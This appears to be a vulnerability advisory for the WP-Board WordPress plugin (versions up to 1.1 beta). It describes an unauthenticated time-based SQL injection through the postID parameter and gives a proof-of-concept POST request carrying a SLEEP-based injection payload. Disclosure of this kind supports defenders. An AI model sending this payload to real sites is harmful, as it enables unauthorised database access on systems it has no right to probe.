## WordPress Plugin Vulnerabilities

# WP-Board <= 1.1 (beta) - Unauthenticated SQL Injection

### Description

The options.php file of the plugin accepts a postid parameter which is not sanitised, escaped or validated before inserting to a SQL statement, leading to SQL injection. This is a time based SQLI and in the same function vulnerable parameter is passed twice so if we pass time as 5 seconds it takes 10 seconds to return since the query ran twice.

### Proof of Concept

POST /wp-content/plugins/wp-board/php/actions.php?action=modp&postID=0%20AND%20(SELECT%201067%20FROM (SELECT(SLEEP(5)))PVan) HTTP/1.1
Content-Length: 19
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: \*/\*
